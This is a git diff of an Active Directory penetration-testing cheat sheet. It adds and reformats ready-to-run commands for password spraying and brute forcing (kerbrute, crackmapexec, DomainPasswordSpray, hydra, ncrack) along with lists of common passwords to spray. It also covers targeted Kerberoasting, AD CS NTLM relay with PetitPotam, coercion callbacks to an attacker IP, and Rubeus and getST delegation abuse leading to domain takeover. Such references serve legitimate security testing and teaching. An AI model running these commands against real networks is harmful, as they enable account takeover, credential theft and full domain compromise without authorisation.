@@ -81,6 +81,8 @@
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
     - [Forest to Forest Compromise - Trust Ticket](#forest-to-forest-compromise---trust-ticket)
     - [Kerberos Unconstrained Delegation](#kerberos-unconstrained-delegation)
+      - [SpoolService Abuse with Unconstrained Delegation](#spoolservice-abuse-with-unconstrained-delegation)
+      - [MS-EFSRPC Abuse with Unconstrained Delegation](#ms---efsrpc-abuse-with-unconstrained-delegation)
     - [Kerberos Constrained Delegation](#kerberos-constrained-delegation)
     - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
     - [Kerberos Bronze Bit Attack - CVE-2020-17049](#kerberos-bronze-bit-attack---cve-2020-17049)
@@ -1058,11 +1060,12 @@ Password spraying refers to the attack method that takes a large number of usern
 
 Most of the time the best passwords to spray are :
 
-- P@ssw0rd01, Password123, mimikatz
+- P@ssw0rd01, Password123, Password1, Hello123, mimikatz
 - Welcome1/Welcome01
 - $Companyname1 : $Microsoft1
-- SeasonYear : Winter2019*,Spring2020!,Summer2018? 
+- SeasonYear : Winter2019*, Spring2020!, Summer2018?, Summer2020, July2020!
 - Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)
+
 
 #### Kerberos pre-auth bruteforcing
 
@@ -1070,53 +1073,51 @@ Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
 
 > Kerberos pre-authentication errors are not logged in Active Directory with a normal **Logon failure event (4625)**, but rather with specific logs to **Kerberos pre-authentication failure (4771)**.
 
-```powershell
-# Username bruteforce
-root@kali:~$ ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt
-
-# Password brute
-root@kali:~$ ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username
-
-# Password spray
-root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
-root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
-root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log
-```
+* Username bruteforce
+  ```powershell
+  root@kali:~$ ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt
+  ```
+* Password bruteforce
+  ```powershell
+  root@kali:~$ ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username
+  ```
+* Password spray
+  ```powershell
+  root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
+  root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
+  root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log
+  ```
 
 #### Spray a pre-generated passwords list
 
-Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
-
-```powershell
-crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
-```
-
-Using `DomainPasswordSpray` to spray a password against all users of a domain.
-
-```powershell
-# https://github.com/dafthack/DomainPasswordSpray
-Invoke-DomainPasswordSpray -Password Summer2021!
-
-# /!\ be careful with the account lockout !
-Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
-
-```
+* Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
+  ```powershell
+  crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
+  ```
+* Using `DomainPasswordSpray` to spray a password against all users of a domain.
+  ```powershell
+  # https://github.com/dafthack/DomainPasswordSpray
+  Invoke-DomainPasswordSpray -Password Summer2021!
+  # /!\ be careful with the account lockout !
+  Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
+  ```
+* Using `SMBAutoBrute`.
+  ```powershell
+  Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
+  ```
 
 #### Spray passwords against the RDP service
 
-Using RDPassSpray to target RDP services.
-
-```powershell
-git clone https://github.com/xFreed0m/RDPassSpray
-python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
-```
-
-Using hydra and ncrack to target RDP services.
-
-```powershell
-hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
-ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
-```
+* Using RDPassSpray to target RDP services.
+  ```powershell
+  git clone https://github.com/xFreed0m/RDPassSpray
+  python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
+  ```
+* Using hydra and ncrack to target RDP services.
+  ```powershell
+  hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
+  ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
+  ```
 
 #### BadPwdCount attribute
 
@@ -1410,6 +1411,13 @@ Any valid domain user can request a kerberos ticket (TGS) for any domain service
   ```powershell
   ./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true
   ```
+
+* [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
+  ```powershell
+  # for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), 
+  # print the "kerberoast" hash, and delete the temporary SPN set for that operation
+  targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]
+  ``` 
 
 
 Then crack the ticket using the correct hashcat mode (`$krb5tgs$23`= `etype 23`) 
@@ -1765,13 +1773,15 @@ Terminal> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
 
 #### AD CS Relay Attack
 
+> An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.
+
 Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101)
 
 * Version 1: NTLM Relay + Rubeus + PetitPotam
     ```powershell
     impacket> python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
     impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template workstation
-    # template workstation, DomainController, Machine
+    # Templates: workstation, DomainController, Machine; KerberosAuthentication
 
     # Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam 
     # You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN
@@ -2289,6 +2299,22 @@ Then you can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HA
 * Ensure sensitive accounts cannot be delegated
 * Disable the Print Spooler Service
 
+
+#### MS-EFSRPC Abuse with Unconstrained Delegation
+
+Using `PetitPotam`, another tool to coerce a callback from the targeted machine, instead of `SpoolSample`.
+
+```powershell
+# Coerce the callback
+git clone https://github.com/topotam/PetitPotam
+python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
+python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
+
+# Extract the ticket
+.\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
+```
+
+
 ### Kerberos Constrained Delegation
 
 > Request a Kerberos ticket which allows us to exploit delegation configurations, we can once again use Impackets getST.py script, however,
@@ -2303,25 +2329,19 @@ $ Get-DomainComputer -TrustedToAuth | select -exp dnshostname
 $ Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
 ```
 
-#### Exploit with Impacket
-```ps1
-$ getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
-Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+#### Exploit the Constrained Delegation
 
-[*] Getting TGT for user
-[*] Impersonating Administrator
-[*]     Requesting S4U2self
-[*]     Requesting S4U2Proxy
-[*] Saving ticket in Administrator.ccache
-```
-
-#### Exploit with Rubeus
-```ps1
-$ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:...
-$ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
-$ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
-$ dir \\dc.domain.com\c$
-```
+* Impacket
+  ```ps1
+  $ getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
+  ```
+* Rubeus
+  ```ps1
+  $ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:...
+  $ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
+  $ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
+  $ dir \\dc.domain.com\c$
+  ```
 
 #### Impersonate a domain user on a resource
 
@@ -2852,3 +2872,5 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab#Previous%20Work)
 * [Playing with PrintNightmare - 0xdf - Jul 8, 2021](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)
 * [Attacking Active Directory: 0 to 0.9 - Eloy Pérez González - 2021/05/29](https://zer1t0.gitlab.io/posts/attacking_ad/)
+* [Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021](https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/)
+* [Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021](http://www.harmj0y.net/blog/activedirectory/certified-pre-owned/)
